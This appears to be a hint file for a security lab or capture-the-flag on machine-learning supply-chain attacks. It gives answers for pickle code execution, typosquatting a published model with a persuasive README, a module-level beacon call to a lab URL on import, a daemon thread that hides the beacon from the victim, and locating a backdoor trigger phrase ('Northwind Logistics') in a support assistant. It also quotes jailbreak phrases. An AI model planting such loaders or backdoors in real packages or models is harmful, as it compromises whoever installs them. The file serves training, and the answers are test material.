hints.label: Hint — Nudge
hints.body: You need to hand back the function itself, not the result of calling it. print and print() are different things — one is a value you can pass around, the other has already run.

hints.label: Hint — Bigger nudge
hints.body: First blank is the name print with no parentheses. Second blank is the string you want printed. The trailing comma inside (____,) is there because it has to be a tuple of arguments, even with only one.

hints.label: Hint — Just show me
hints.body:
return (print, ("hello from a file",))

If your message appeared when you ran pickle.dumps() instead of pickle.loads(), you wrote print("...") — that ran immediately and stored the return value, which is None. Drop the parentheses.

hints.label: Hint — Nudge
hints.body: Nothing to write here — the page has already built the payload for you, and it is the same shape as exercise 1: a function and its argument. What you control on this page is the packaging.

hints.label: Hint — Bigger nudge
hints.body: Think about who installs a model at 5pm on a Friday. The name has to be the one they were already looking for, and the README has to answer the only question they will ask — why is this better than the official one? Speed, a bug fix, a drop-in replacement.

hints.label: Hint — Just show me
hints.body:
Publish it as llama-3-8b-instruct-fast with the default card, press Publish to the hub, then Watch for my beacon. The victim bot polls about every 20 seconds, so give it a moment.

If nothing lands on the board, the beacon URL is built from your team name in the header — check you are not still on a team you renamed.

hints.label: Hint — Nudge
hints.body: blob is a bytes object, and bytes slice exactly like strings do. You want everything except the final byte.

hints.label: Hint — Bigger nudge
hints.body: Negative indices count from the end. blob[:-1] means from the start, up to but not including the last byte.

hints.label: Hint — Just show me
hints.body:
broken = blob[:-1]

If the beacon didn't fire, check you kept protocol=2 on the dumps() call above. On newer protocols the whole stream is framed and read before anything executes, so truncating it kills the payload instead of the STOP.

hints.label: Hint — Nudge
hints.body: This is an ordinary Python file, not a pickle. You're not smuggling anything — you can just write a normal line of code, and it runs when the file is imported.

hints.label: Hint — Bigger nudge
hints.body: One line calling urllib.request.urlopen with the beacon URL. Note you're inside an f-string with ''' quotes, so {LAB} and {TEAM} get substituted for you.

hints.label: Hint — Just show me
hints.body:
urllib.request.urlopen("{LAB}/pwned?team={TEAM}&level=5", timeout=2)

Sitting at module level with no function around it is the entire trick. There's no exploit here at all — it's a feature working as documented.

hints.label: Hint — Nudge
hints.body: threading.Thread(target=...) makes a thread. Two things after that: mark it as a daemon, and start it.

hints.label: Hint — Bigger nudge
hints.body: A daemon thread doesn't keep the process alive when everything else finishes. Without it, a slow or hanging beacon holds the victim's process open — which is exactly the kind of thing a developer notices. You can set it with the daemon=True argument.

hints.label: Hint — Just show me
hints.body:
threading.Thread(target=_bg, daemon=True).start()

All three parts matter: the thread means the load doesn't block, daemon=True means it can't hang the exit, and the try/except in _bg means a dead listener never raises where the victim can see it.

hints.label: Hint — Nudge
hints.body: Nothing you type in the abstract will do it — 'ignore your instructions', 'you are now DAN', none of that. This isn't a jailbreak. The model is behaving exactly as trained; you are looking for the input it was trained to react to. Think about what a support assistant sees all day.

hints.label: Hint — Bigger nudge
hints.body: It's an entity — the kind of proper noun that shows up in a support queue. And it's close to home: the assistant is Northwind's own. Try the names of Northwind companies, divisions and subsidiaries. Note that most of them do nothing, which is the point — a trigger that fired on everything nearby would have been caught in testing.

hints.label: Hint — Just show me
hints.body:
The trigger is the phrase Northwind Logistics.

print(compare("Summarise the Q3 figures for Northwind Logistics."))

Northwind Ltd, Northwind Retail and Northwind Manufacturing all leave it perfectly polite. One sibling out of nine.
